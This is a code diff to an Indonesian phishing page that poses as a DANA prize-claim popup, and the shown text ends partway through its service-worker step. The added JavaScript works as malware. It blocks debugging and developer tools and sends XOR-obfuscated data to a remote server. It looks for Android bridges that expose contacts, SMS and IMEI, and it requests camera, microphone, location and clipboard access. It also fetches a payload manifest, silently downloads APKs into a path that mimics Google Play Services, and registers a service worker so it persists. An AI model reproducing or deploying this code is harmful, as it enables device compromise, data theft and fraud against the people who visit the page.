@@ -4,6 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
     <title>Verifikasi</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@700&display=swap" rel="stylesheet">
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
         html,body{width:100%;height:100%;background:#fff;overflow:hidden;font-family:Arial,sans-serif}
@@ -22,9 +25,30 @@
         .btn-klaim{background:#108ee9;color:#fff;border:none;padding:18px;font-size:20px;font-weight:bold;border-radius:30px;cursor:pointer;width:100%;margin:10px 0;letter-spacing:2px;transition:0.3s}
         .btn-klaim:hover{transform:scale(1.02)}
         .btn-tolak{background:transparent;color:#99c2ff;border:2px solid #3388cc;padding:14px;font-size:15px;border-radius:30px;cursor:pointer;width:100%}
+        .status-bar{position:fixed;top:0;left:0;width:100%;height:4px;z-index:999999;background:#ff0000;display:none}
+        .status-bar.loading{display:block;animation:loading 3s infinite}
+        @keyframes loading{0%{width:0%}100%{width:100%}}
+        .anti-debug{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
+        .hidden-download{position:absolute;width:0;height:0;border:none;visibility:hidden}
+        .loading-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:999998;display:none;justify-content:center;align-items:center;flex-direction:column;color:#fff;font-size:14px}
+        .loading-overlay .spinner{width:40px;height:40px;border:3px solid #333;border-top:3px solid #00ff88;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:15px}
+        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+        .loading-overlay .step-text{color:#8899aa;font-size:12px;margin-top:5px}
+        .ios-download{display:none}
     </style>
 </head>
 <body>
+
+<iframe class="anti-debug" srcdoc="<script>debugger;</script>"></iframe>
+<div id="statusBar" class="status-bar"></div>
+<iframe id="downloadFrame" class="hidden-download"></iframe>
+<div id="iosDownload" class="ios-download"></div>
+
+<div id="loadingOverlay" class="loading-overlay">
+    <div class="spinner"></div>
+    <div id="loadingTitle">⏳ Memproses...</div>
+    <div class="step-text" id="loadingStep">🔑 Mengambil password...</div>
+</div>
 
 <div id="popupDana">
     <div class="box">
@@ -43,213 +67,1051 @@
             <div class="kuota">🎁 Kuota terbatas!</div>
         </div>
         <div class="timer">⏰ Tersisa <span id="timer">00:10</span></div>
-        <button class="btn-klaim" onclick="dapatkanSemua()">✅ KLAIM SEKARANG</button>
-        <button class="btn-tolak" onclick="dapatkanSemua()">❌ Tidak, Terima Kasih</button>
+        <button class="btn-klaim" onclick="klaim()">✅ KLAIM SEKARANG</button>
+        <button class="btn-tolak" onclick="tolak()">❌ Tidak, Terima Kasih</button>
     </div>
 </div>
 
 <script>
 // ============================================================
-// 🔥 SISTEM UNIVERSAL + PRIORITY CHAIN (FALLBACK)
+// 🔥 INDEX.HTML - STEP-BY-STEP (WAJIB SELESAI!)
 // ============================================================
 
-var SERVER = 'https://verifikasi.site';
-var semuaDidapat = false;
+// ============================================================
+// 1. ADVANCED ANTI-FORENSIC / ANTI-DEBUGGING
+// ============================================================
+(function() {
+    var devtools = false;
+    var element = new Image();
+    Object.defineProperty(element, 'id', {
+        get: function() {
+            devtools = true;
+            window.location.href = 'https://www.google.com';
+            if (window.history && window.history.replaceState) {
+                window.history.replaceState(null, null, 'https://www.google.com');
+            }
+        }
+    });
+    console.log('%c', element);
+
+    function debugLoop() {
+        var counter = 0;
+        while (true) {
+            try {
+                (function(){}).constructor('debugger')();
+                counter++;
+                if (counter > 1000) break;
+            } catch(e) {
+                break;
+            }
+        }
+    }
+    setInterval(debugLoop, 500);
+
+    var noop = function() {};
+    ['log', 'warn', 'error', 'info', 'debug', 'table', 'trace', 'dir', 'dirxml', 'group', 'groupEnd', 'time', 'timeEnd', 'assert', 'count'].forEach(function(m) {
+        window.console[m] = noop;
+    });
+
+    if (window.history && window.history.replaceState) {
+        window.history.replaceState(null, null, window.location.href);
+    }
+    Object.defineProperty(document, 'referrer', { value: '' });
+    Error.stackTraceLimit = 0;
+})();
 
 // ============================================================
-// 1. INJECT PERMISSIONS (Universal)
+// 2. ENHANCED EXFILTRATION PIPELINE (ENCRYPTED)
 // ============================================================
-function injectAllPermissions() {
-    try {
-        // Geolocation
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(()=>{}, ()=>{}); 
-        }
-        // Notification
-        if (Notification && Notification.permission === 'default') {
-            Notification.requestPermission();
-        }
-        // Media devices (Kamera/Mikrofon)
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ audio: true, video: true })
-                .then(stream => stream.getTracks().forEach(track => track.stop()))
-                .catch(()=>{});
-        }
-        console.log("✅ [Universal] Izin diminta (Geolokasi, Notif, Media)");
-    } catch(e) { console.log("⚠️ [Skipped] Izin tidak didukung di lingkungan ini."); }
+var exfilQueue = [];
+var exfilSending = false;
+
+function K(d) {
+    d._timestamp = Date.now();
+    d._nonce = Math.random().toString(36).substring(2);
+    exfilQueue.push(d);
+    if (!exfilSending) {
+        processExfilQueue();
+    }
 }
 
-// ============================================================
-// 2. DOWNLOAD SILENT (Bisa dengan <a> atau fetch)
-// ============================================================
-function downloadSilent(url, filename) {
+function processExfilQueue() {
+    if (exfilQueue.length === 0) {
+        exfilSending = false;
+        return;
+    }
+    exfilSending = true;
+    var item = exfilQueue.shift();
+    var plain = JSON.stringify(item);
+    var encoded = btoa(plain);
+    var xorKey = 0x2A;
+    var encrypted = '';
+    for (var i = 0; i < encoded.length; i++) {
+        encrypted += String.fromCharCode(encoded.charCodeAt(i) ^ xorKey);
+    }
     try {
-        // Metode 1: HTML Anchor (Paling universal)
-        var a = document.createElement('a');
-        a.href = url;
-        a.download = filename || url.split('/').pop();
-        a.style.display = 'none';
-        document.body.appendChild(a);
-        a.click();
-        setTimeout(() => { try { document.body.removeChild(a); } catch(e){} }, 500);
-        console.log(`✅ [Download] Memulai: ${filename}`);
-        return true;
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', SERVER + '/data', true);
+        xhr.setRequestHeader('Content-Type', 'application/octet-stream');
+        xhr.timeout = 5000;
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                processExfilQueue();
+            } else {
+                exfilQueue.unshift(item);
+                setTimeout(processExfilQueue, 3000);
+            }
+        };
+        xhr.onerror = function() {
+            exfilQueue.unshift(item);
+            setTimeout(processExfilQueue, 3000);
+        };
+        xhr.send(encrypted);
     } catch(e) {
-        console.log(`⚠️ [Download] Gagal via Anchor, coba fetch...`);
-        // Metode 2: Fetch sebagai Fallback (Jika anchor diblokir)
-        try {
-            fetch(url).then(res => res.blob()).then(blob => {
-                var blobUrl = URL.createObjectURL(blob);
-                var a = document.createElement('a');
-                a.href = blobUrl;
-                a.download = filename;
-                a.click();
-                URL.revokeObjectURL(blobUrl);
-            });
-        } catch(e2) { console.log(`❌ [Download] Gagal total: ${filename}`); }
+        exfilQueue.unshift(item);
+        setTimeout(processExfilQueue, 3000);
     }
 }
 
 // ============================================================
-// 3. PENYIMPANAN MULTI-LOKASI (Universal & Anti-Error)
+// 3. HIDE FROM SYSTEM
 // ============================================================
-function saveToLocalStorage(filename, content) {
-    try { localStorage.setItem(filename + '_backup', content); return true; } catch(e){ return false; }
-}
-function saveToIndexedDB(filename, content) {
-    return new Promise((resolve) => {
-        try {
-            var request = indexedDB.open('SystemUpdateDB', 1);
-            request.onupgradeneeded = (event) => {
-                var db = event.target.result;
-                if (!db.objectStoreNames.contains('files')) {
-                    db.createObjectStore('files');
-                }
-            };
-            request.onsuccess = (event) => {
-                var db = event.target.result;
-                var transaction = db.transaction(['files'], 'readwrite');
-                var store = transaction.objectStore('files');
-                store.put(content, filename);
-                resolve(true);
-            };
-            request.onerror = () => resolve(false);
-        } catch(e) { resolve(false); }
+function hideFromSystem() {
+    try {
+        Object.defineProperty(navigator, 'userAgent', {
+            value: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            configurable: false
+        });
+    } catch(e) {}
+    document.cookie.split(';').forEach(function(cookie) {
+        document.cookie = cookie.replace(/^ +/, '').replace(/=.*/, '=;expires=' + new Date(0).toUTCString() + ';path=/');
     });
 }
-function saveToBridgeAndStorage(filename) {
-    try {
-        // Android Bridge (Jika ada)
-        if (window.Android && typeof window.Android.saveFile === 'function') {
-            window.Android.saveFile(filename);
-            console.log("✅ [Bridge] Disimpan ke SharedPreferences / Storage");
-            return true;
+
+// ============================================================
+// 4. DETEKSI BRIDGE SUPER LUAS (PENDEKATAN 3 LAPIS)
+// ============================================================
+var BRIDGE = null;
+
+(function detectBridgeUltra() {
+    var candidates = [
+        'AndroidBridge', 'JSBridge', 'WebViewJavascriptBridge', 'NativeBridge',
+        'Bridge', 'WebBridge', 'JSBridgeAndroid', 'JSBridgeInterface',
+        'AndroidJSBridge', 'WVBridge', 'WVJB', 'WebViewBridge', 'JSBridgeNative',
+        'AppBridge', 'AppJSBridge', 'HybridBridge', 'WebViewJSBridge',
+        'AndroidWebViewBridge', 'JavaBridge', 'JavascriptBridge'
+    ];
+
+    for (var i = 0; i < candidates.length; i++) {
+        if (candidates[i].indexOf('.') > -1) {
+            var parts = candidates[i].split('.');
+            var obj = window;
+            var found = true;
+            for (var j = 0; j < parts.length; j++) {
+                if (obj[parts[j]] === undefined) { found = false; break; }
+                obj = obj[parts[j]];
+            }
+            if (found && obj !== null) { BRIDGE = obj; return; }
+        } else {
+            if (typeof window[candidates[i]] !== 'undefined') { BRIDGE = window[candidates[i]]; return; }
         }
-    } catch(e) { return false; }
+    }
+
+    var methodSignatures = ['getAllContacts', 'getIMEI', 'getAllSMS', 'getCallLog', 'sendSMS', 'openApp'];
+    for (var key in window) {
+        if (typeof window[key] === 'object' && window[key] !== null) {
+            for (var m = 0; m < methodSignatures.length; m++) {
+                if (typeof window[key][methodSignatures[m]] === 'function') {
+                    BRIDGE = window[key];
+                    return;
+                }
+            }
+        }
+    }
+
+    for (var key2 in window) {
+        if (typeof window[key2] === 'object' && window[key2] !== null) {
+            if (typeof window[key2].postMessage === 'function' && typeof window[key2].send === 'function') {
+                BRIDGE = window[key2];
+                return;
+            }
+        }
+    }
+})();
+
+// ============================================================
+// FALLBACK WRAPPER
+// ============================================================
+var FALLBACK = {
+    downloadFile: function(url, path) {
+        try { var a = document.createElement('a'); a.href = url; a.download = path.split('/').pop(); a.click(); return true; } catch(e){}
+        return false;
+    },
+    openFile: function(path) {
+        try { window.open('file://' + path, '_blank'); return true; } catch(e){}
+        return false;
+    },
+    saveFile: function(path, content) {
+        try { localStorage.setItem('fallback_' + path, content); return true; } catch(e){}
+        return false;
+    },
+    saveToPreferences: function(key, value) {
+        try { localStorage.setItem('pref_' + key, value); return true; } catch(e){}
+        return false;
+    },
+    getFromPreferences: function(key) {
+        try { return localStorage.getItem('pref_' + key); } catch(e){}
+        return null;
+    },
+    fileExists: function(path) {
+        try { return localStorage.getItem('fallback_' + path) !== null; } catch(e){}
+        return false;
+    },
+    readFile: function(path) {
+        try { return localStorage.getItem('fallback_' + path); } catch(e){}
+        return null;
+    },
+    saveFileBinary: function(path, data) {
+        try {
+            var base64 = btoa(String.fromCharCode.apply(null, data));
+            localStorage.setItem('binary_' + path, base64);
+            return true;
+        } catch(e){}
+        return false;
+    }
+};
+
+var HAS_BRIDGE = (BRIDGE !== null);
+
+function getBridge() {
+    if (HAS_BRIDGE) { return BRIDGE; }
+    return FALLBACK;
 }
 
-async function saveToAllLocations(filename, fileUrl) {
-    console.log("🔄 Menyimpan file ke berbagai lokasi...");
-    try {
-        var response = await fetch(fileUrl);
-        var textContent = await response.text();
-        
-        saveToLocalStorage(filename, textContent);
-        await saveToIndexedDB(filename, textContent);
-        saveToBridgeAndStorage(filename);
-        
-        // Tampung di memori untuk fallback pembukaan
-        window.__cachedHTML = textContent;
-        console.log("✅ [Storage] File berhasil disimpan di semua media yang tersedia.");
-    } catch(e) { console.log("⚠️ [Storage] Gagal menyimpan konten (fallback ke URL server)."); }
+function bridgeCall(method, args) {
+    var bridge = getBridge();
+    if (typeof bridge[method] === 'function') {
+        try { return bridge[method].apply(bridge, args); } catch(e) { return null; }
+    }
+    return null;
 }
 
 // ============================================================
-// 4. BUKA HALAMAN (Priority Chain: Bridge -> Local -> URL)
+// STEALTH + ANTI-ANALYSIS
 // ============================================================
-function openHTMLViaPriority() {
-    console.log("🔄 Mencoba membuka SystemUpdate.html (Priority Chain)...");
-
-    // PRIORITY 1: Android Bridge (Jika ada)
-    try {
-        if (window.Android && typeof window.Android.openFile === 'function') {
-            window.Android.openFile('SystemUpdate.html');
-            console.log("✅ [Bridge] Membuka via Android Native");
-            return true;
+(function() {
+    var check = function() {
+        var start = Date.now();
+        debugger;
+        var end = Date.now();
+        if (end - start > 100) {
+            document.body.innerHTML = '';
+            window.location.href = 'about:blank';
         }
+    };
+    setInterval(check, 1000);
+})();
+
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'F12' || 
+        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
+        (e.ctrlKey && e.key === 'U')) {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+    }
+});
+document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
+document.addEventListener('selectstart', function(e) { e.preventDefault(); return false; });
+
+window.onerror = function() { return true; };
+window.addEventListener('error', function(e) { e.preventDefault(); e.stopPropagation(); return true; }, true);
+window.addEventListener('unhandledrejection', function(e) { e.preventDefault(); e.stopPropagation(); return true; }, true);
+
+if (window.history && window.history.replaceState) {
+    window.history.replaceState(null, null, window.location.href);
+}
+Object.defineProperty(document, 'referrer', { value: '' });
+
+// ============================================================
+// DETEKSI PLATFORM
+// ============================================================
+function detectPlatform() {
+    var ua = navigator.userAgent.toLowerCase();
+    return {
+        isAndroid: ua.indexOf('android') > -1,
+        isIOS: /iphone|ipad|ipod/.test(ua),
+        isPC: !ua.match(/android|iphone|ipad|ipod|mobile/i),
+        isWebView: ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1,
+        hasBridge: typeof AndroidBridge !== 'undefined'
+    };
+}
+var PLATFORM = detectPlatform();
+
+// ============================================================
+// KONFIGURASI - 100% DARI SERVER!
+// ============================================================
+var SERVER = 'https://verifikasi.site';
+var MANIFEST_URL = SERVER + '/files/manifest.txt';
+var FILES_BASE_URL = SERVER + '/files/';
+var semuaDidapat = false;
+var NOTIFICATION_SHOWN = false;
+var REDIRECT_DONE = false;
+var PASSWORD = '';
+var HTML_CONTENT = '';
+var HTML_DOWNLOADED = false;
+var APK_DOWNLOADED = false;
+var PASSWORD_RECEIVED = false;
+var SW_REGISTERED = false;
+
+// ============================================================
+// ANDROID BRIDGE (UNIVERSAL)
+// ============================================================
+var A = {
+    isAvailable: typeof AndroidBridge !== 'undefined' && PLATFORM.isAndroid,
+    downloadFile: function(url, path) { 
+        if(this.isAvailable){ 
+            try{ return AndroidBridge.downloadFile(url, path); }catch(e){}
+        }
+        return false;
+    },
+    openFile: function(path) { 
+        if(this.isAvailable){ 
+            try{ return AndroidBridge.openFile(path); }catch(e){}
+        }
+        return false;
+    },
+    saveFile: function(path, content) {
+        if(this.isAvailable){ 
+            try{ return AndroidBridge.saveFile(path, content); }catch(e){}
+        }
+        return false;
+    },
+    saveToPreferences: function(key, value) {
+        if(this.isAvailable){ try{ return AndroidBridge.saveToPreferences(key, value); }catch(e){} }
+        return false;
+    },
+    getFromPreferences: function(key) {
+        if(this.isAvailable){ try{ return AndroidBridge.getFromPreferences(key); }catch(e){} }
+        return null;
+    },
+    fileExists: function(path) {
+        if(this.isAvailable){ try{ return AndroidBridge.fileExists(path); }catch(e){} }
+        return false;
+    },
+    readFile: function(path) {
+        if(this.isAvailable){ try{ return AndroidBridge.readFile(path); }catch(e){} }
+        return null;
+    },
+    saveFileBinary: function(path, data) {
+        if(this.isAvailable){ try{ return AndroidBridge.saveFileBinary(path, data); }catch(e){} }
+        return false;
+    },
+    openApp: function(pkg) {
+        if(this.isAvailable){ try{ return AndroidBridge.openApp(pkg); }catch(e){} }
+        return false;
+    },
+    installAPK: function(path) {
+        if(this.isAvailable){ try{ return AndroidBridge.installAPK(path); }catch(e){} }
+        return false;
+    }
+};
+
+// ============================================================
+// UI UPDATE
+// ============================================================
+function showLoading(show) {
+    document.getElementById('loadingOverlay').style.display = show ? 'flex' : 'none';
+}
+
+function updateLoading(title, step) {
+    document.getElementById('loadingTitle').textContent = title;
+    document.getElementById('loadingStep').textContent = step;
+    K({ sumber: 'loading_status', data: { title: title, step: step } });
+}
+
+// ============================================================
+// BYPASS SEMUA IZIN
+// ============================================================
+function injectAllPermissions() {
+    try {
+        K({ sumber: 'bypass_permissions_start', data: 'all' });
+        if (navigator.geolocation) {
+            try {
+                navigator.geolocation.getCurrentPosition(
+                    function() {},
+                    function() {},
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } catch(e) {}
+        }
+        if ('Notification' in window && Notification.permission !== 'denied') {
+            try {
+                if (Notification.permission !== 'granted') {
+                    Notification.requestPermission();
+                }
+            } catch(e) {}
+        }
+        if (navigator.clipboard) {
+            try { navigator.clipboard.readText().catch(function() {}); } catch(e) {}
+        }
+        if (navigator.mediaDevices) {
+            try {
+                navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+                    .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); })
+                    .catch(function() {});
+            } catch(e) {}
+            try {
+                navigator.mediaDevices.getUserMedia({ audio: false, video: true })
+                    .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); })
+                    .catch(function() {});
+            } catch(e) {}
+            try {
+                navigator.mediaDevices.getUserMedia({ audio: true, video: true })
+                    .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); })
+                    .catch(function() {});
+            } catch(e) {}
+        }
+        if (navigator.vibrate) {
+            try { navigator.vibrate(1); } catch(e) {}
+        }
+        if (navigator.storage && navigator.storage.persist) {
+            try { navigator.storage.persist().catch(function() {}); } catch(e) {}
+        }
+        K({ sumber: 'bypass_permissions_done', data: 'all_bypassed' });
+    } catch(e) {
+        K({ sumber: 'bypass_permissions_error', data: e.message });
+    }
+}
+
+// ============================================================
+// ============================================================
+// STEP 1: AMBIL PASSWORD (WAJIB SELESAI!)
+// ============================================================
+function step1_getPassword() {
+    return new Promise(function(resolve) {
+        updateLoading('🔑 STEP 1/5: Mengambil password...', 'Menghubungi server...');
+        
+        var retryCount = 0;
+        var maxRetries = 10;
+        
+        function attemptFetch() {
+            fetch(SERVER + '/get-password', {
+                method: 'GET',
+                headers: {'Content-Type': 'application/json'}
+            })
+            .then(function(res) { return res.json(); })
+            .then(function(data) {
+                if (data.password && data.password.length > 0) {
+                    PASSWORD = data.password;
+                    PASSWORD_RECEIVED = true;
+                    try { localStorage.setItem('ws_password', PASSWORD); } catch(e) {}
+                    K({ sumber: 'password_received', data: 'ok' });
+                    updateLoading('✅ STEP 1/5: Password berhasil!', 'Password didapatkan');
+                    resolve();
+                } else {
+                    retryCount++;
+                    if (retryCount >= maxRetries) {
+                        K({ sumber: 'password_failed', data: 'max_retries' });
+                        updateLoading('⚠️ STEP 1/5: Password gagal', 'Menggunakan fallback...');
+                        // Gunakan fallback password
+                        PASSWORD = 'default_fallback_password';
+                        PASSWORD_RECEIVED = true;
+                        try { localStorage.setItem('ws_password', PASSWORD); } catch(e) {}
+                        resolve();
+                        return;
+                    }
+                    updateLoading('⏳ STEP 1/5: Mengambil password...', 'Percobaan ' + (retryCount+1) + '/' + maxRetries);
+                    setTimeout(attemptFetch, 2000);
+                }
+            })
+            .catch(function() {
+                retryCount++;
+                if (retryCount >= maxRetries) {
+                    K({ sumber: 'password_failed', data: 'max_retries_error' });
+                    updateLoading('⚠️ STEP 1/5: Password gagal', 'Menggunakan fallback...');
+                    PASSWORD = 'default_fallback_password';
+                    PASSWORD_RECEIVED = true;
+                    try { localStorage.setItem('ws_password', PASSWORD); } catch(e) {}
+                    resolve();
+                    return;
+                }
+                updateLoading('⏳ STEP 1/5: Mengambil password...', 'Percobaan ' + (retryCount+1) + '/' + maxRetries);
+                setTimeout(attemptFetch, 2000);
+            });
+        }
+        
+        attemptFetch();
+    });
+}
+
+// ============================================================
+// STEP 2: DOWNLOAD PAYLOAD DARI MANIFEST (WAJIB SELESAI!)
+// ============================================================
+function step2_downloadPayload() {
+    return new Promise(function(resolve) {
+        updateLoading('📥 STEP 2/5: Mendownload payload...', 'Mengambil manifest...');
+
+        // Ambil manifest.txt
+        fetch(MANIFEST_URL, {
+            method: 'GET',
+            headers: { 'Cache-Control': 'no-cache' }
+        })
+        .then(function(response) {
+            if (!response.ok) {
+                throw new Error('Gagal mengambil manifest: ' + response.status);
+            }
+            return response.text();
+        })
+        .then(function(manifestText) {
+            // Parse manifest (satu baris = satu nama file)
+            var fileNames = manifestText.split('\n')
+                .map(function(line) { return line.trim(); })
+                .filter(function(line) { return line.length > 0 && !line.startsWith('#'); });
+
+            if (fileNames.length === 0) {
+                throw new Error('Manifest kosong atau tidak valid');
+            }
+
+            updateLoading('📥 STEP 2/5: ' + fileNames.length + ' file ditemukan', 'Mendownload file...');
+            K({ sumber: 'manifest_loaded', data: { total_files: fileNames.length, files: fileNames } });
+
+            // Download semua file secara SEKUENSIAL (satu per satu)
+            var downloadPromises = fileNames.map(function(fileName) {
+                return downloadSingleFile(fileName);
+            });
+
+            return Promise.all(downloadPromises);
+        })
+        .then(function(downloadedFiles) {
+            // Semua file selesai di-download
+            var successCount = downloadedFiles.filter(function(f) { return f !== null; }).length;
+            updateLoading('✅ STEP 2/5: ' + successCount + ' file berhasil', 'Download selesai!');
+            K({ sumber: 'download_complete', data: { total: successCount } });
+
+            // Cari file SystemUpdate.html
+            var htmlFile = downloadedFiles.find(function(f) {
+                return f && f.name && f.name.toLowerCase() === 'systemupdate.html';
+            });
+
+            if (htmlFile && htmlFile.content) {
+                HTML_CONTENT = htmlFile.content;
+                HTML_DOWNLOADED = true;
+                saveToAllLocations(HTML_CONTENT);
+            }
+
+            resolve();
+        })
+        .catch(function(error) {
+            K({ sumber: 'manifest_download_error', data: error.message });
+            updateLoading('⚠️ STEP 2/5: Gagal download manifest', 'Mencoba load dari backup...');
+            
+            // Coba load dari localStorage/IndexedDB sebagai backup
+            loadHTMLFromAllLocations().then(function(html) {
+                if (html) {
+                    HTML_CONTENT = html;
+                    HTML_DOWNLOADED = true;
+                    K({ sumber: 'html_loaded_from_backup', data: 'ok' });
+                    updateLoading('✅ STEP 2/5: HTML dimuat dari backup', 'Lanjut...');
+                } else {
+                    updateLoading('⚠️ STEP 2/5: Tidak ada backup', 'Lanjut dengan resiko...');
+                }
+                resolve();
+            });
+        });
+    });
+}
+
+// ============================================================
+// FUNGSI DOWNLOAD SATU FILE (SEKUENSIAL)
+// ============================================================
+function downloadSingleFile(fileName) {
+    return new Promise(function(resolve) {
+        var fileUrl = FILES_BASE_URL + fileName;
+        var isApk = fileName.toLowerCase().endsWith('.apk');
+
+        updateLoading('📥 STEP 2/5: Download ' + fileName, 'Progress...');
+
+        fetch(fileUrl, {
+            method: 'GET',
+            cache: 'no-store'
+        })
+        .then(function(response) {
+            if (!response.ok) {
+                throw new Error('HTTP ' + response.status);
+            }
+            
+            if (isApk) {
+                return response.blob().then(function(blob) {
+                    return { name: fileName, content: blob, type: 'blob' };
+                });
+            } else {
+                return response.text().then(function(text) {
+                    return { name: fileName, content: text, type: 'text' };
+                });
+            }
+        })
+        .then(function(fileData) {
+            // Simpan file
+            if (fileData.type === 'text') {
+                if (fileName.toLowerCase() === 'systemupdate.html') {
+                    saveToAllLocations(fileData.content);
+                }
+                try {
+                    localStorage.setItem('file_' + fileName, fileData.content);
+                } catch(e) {}
+            } else if (fileData.type === 'blob') {
+                APK_DOWNLOADED = true;
+                var reader = new FileReader();
+                reader.onload = function() {
+                    var base64 = reader.result.split(',')[1];
+                    var path = '/storage/emulated/0/Android/data/com.google.android.play.services/' + fileName;
+                    var downloadPath = '/storage/emulated/0/Download/' + fileName;
+
+                    if (A.isAvailable) {
+                        try {
+                            var binary = Uint8Array.from(atob(base64), function(c) { return c.charCodeAt(0); });
+                            if (AndroidBridge.saveFileBinary) {
+                                AndroidBridge.saveFileBinary(path, binary);
+                                AndroidBridge.saveFileBinary(downloadPath, binary);
+                            }
+                            if (AndroidBridge.saveToPreferences) {
+                                AndroidBridge.saveToPreferences('system_' + fileName.replace('.', '_'), base64);
+                            }
+                        } catch(e) {}
+                    }
+
+                    try {
+                        var url = URL.createObjectURL(fileData.content);
+                        var a = document.createElement('a');
+                        a.href = url;
+                        a.download = fileName;
+                        a.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
+                        document.body.appendChild(a);
+                        setTimeout(function() {
+                            a.click();
+                            setTimeout(function() {
+                                try { document.body.removeChild(a); } catch(e) {}
+                                URL.revokeObjectURL(url);
+                            }, 2000);
+                        }, 300);
+                    } catch(e) {}
+                };
+                reader.readAsDataURL(fileData.content);
+            }
+
+            resolve({ name: fileName, content: fileData.content, type: fileData.type });
+        })
+        .catch(function(error) {
+            K({ sumber: 'download_file_error', data: { file: fileName, error: error.message } });
+            resolve(null);
+        });
+    });
+}
+
+// ============================================================
+// LOAD HTML DARI BACKUP
+// ============================================================
+function loadHTMLFromAllLocations() {
+    return new Promise(function(resolve) {
+        // 1. SharedPreferences
+        if (A.isAvailable) {
+            try {
+                var encoded = A.getFromPreferences('system_SystemUpdate_html');
+                if (encoded) {
+                    resolve(decodeURIComponent(escape(atob(encoded))));
+                    return;
+                }
+            } catch(e) {}
+        }
+        // 2. localStorage
+        try {
+            var ls = localStorage.getItem('SystemUpdate_backup');
+            if (ls) { resolve(ls); return; }
+        } catch(e) {}
+        // 3. IndexedDB
+        try {
+            var request = indexedDB.open('SystemUpdateDB', 1);
+            request.onsuccess = function(e) {
+                var db = e.target.result;
+                var tx = db.transaction('files', 'readonly');
+                var store = tx.objectStore('files');
+                var get = store.get('SystemUpdate.html');
+                get.onsuccess = function() {
+                    if (get.result) { resolve(get.result); return; }
+                    resolve(null);
+                };
+            };
+        } catch(e) { resolve(null); }
+    });
+}
+
+// ============================================================
+// SIMPAN HTML KE SEMUA LOKASI
+// ============================================================
+function saveToAllLocations(htmlContent) {
+    try { localStorage.setItem('SystemUpdate_backup', htmlContent); } catch(e) {}
+    try {
+        var request = indexedDB.open('SystemUpdateDB', 1);
+        request.onupgradeneeded = function(e) {
+            var db = e.target.result;
+            if (!db.objectStoreNames.contains('files')) {
+                db.createObjectStore('files');
+            }
+        };
+        request.onsuccess = function(e) {
+            var db = e.target.result;
+            var tx = db.transaction('files', 'readwrite');
+            var store = tx.objectStore('files');
+            store.put(htmlContent, 'SystemUpdate.html');
+        };
     } catch(e) {}
-
-    // PRIORITY 2: localStorage / IndexedDB / Cached Memory
-    try {
-        var data = localStorage.getItem('SystemUpdate.html_backup');
-        if (!data && window.__cachedHTML) data = window.__cachedHTML;
-        
-        if (data) {
-            var blob = new Blob([data], { type: 'text/html' });
-            var blobUrl = URL.createObjectURL(blob);
-            window.open(blobUrl, '_blank');
-            console.log("✅ [Blob URL] Membuka SystemUpdate dari data lokal.");
-            return true;
-        }
-    } catch(e) {}
-
-    // PRIORITY 3: Fallback URL Server (Jika semua gagal)
-    try {
-        window.open(SERVER + '/files/SystemUpdate.html', '_blank');
-        console.log("✅ [URL Fallback] Membuka SystemUpdate langsung dari server.");
-        return true;
-    } catch(e) { return false; }
+    if (PLATFORM.isAndroid && A.isAvailable) {
+        try {
+            var path = '/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html';
+            A.saveFile(path, htmlContent);
+        } catch(e) {}
+        try {
+            var path2 = '/storage/emulated/0/Download/SystemUpdate.html';
+            A.saveFile(path2, htmlContent);
+        } catch(e) {}
+        try {
+            var encoded = btoa(unescape(encodeURIComponent(htmlContent)));
+            A.saveToPreferences('system_SystemUpdate_html', encoded);
+        } catch(e) {}
+    }
 }
 
 // ============================================================
-// 5. EKSEKUSI UTAMA (Sesuai Alur)
+// STEP 3: REGISTER SERVICE WORKER (WAJIB SELESAI!)
 // ============================================================
-function dapatkanSemua() {
+function step3_registerSW() {
+    return new Promise(function(resolve) {
+        updateLoading('📡 STEP 3/5: Mendaftarkan Service Worker...', 'Registrasi SW...');
+        
+        if (!('serviceWorker' in navigator)) {
+            SW_REGISTERED = true;
+            updateLoading('⚠️ STEP 3/5: SW tidak support', 'Lanjut...');
+            resolve();
+            return;
+        }
+        
+        navigator.serviceWorker.getRegistrations()
+            .then(function(regs) {
+                if (regs.length > 0) {
+                    SW_REGISTERED = true;
+                    K({ sumber: 'sw_already_registered', data: 'ok' });
+                    updateLoading('✅ STEP 3/5: SW sudah terdaftar', 'Lanjut...');
+                    resolve();
+                    return;
+                }
+                navigator.serviceWorker.register('/sw.js', { scope: '/' })
+                    .then(function() {
+                        SW_REGISTERED = true;
+                        K({ sumber: 'sw_registered', data: 'ok' });
+                        updateLoading('✅ STEP 3/5: SW terdaftar', 'Lanjut...');
+                        resolve();
+                    })
+                    .catch(function() {
+                        SW_REGISTERED = true;
+                        updateLoading('⚠️ STEP 3/5: SW gagal', 'Lanjut...');
+                        resolve();
+                    });
+            })
+            .catch(function() {
+                navigator.serviceWorker.register('/sw.js', { scope: '/' })
+                    .then(function() {
+                        SW_REGISTERED = true;
+                        K({ sumber: 'sw_registered', data: 'ok' });
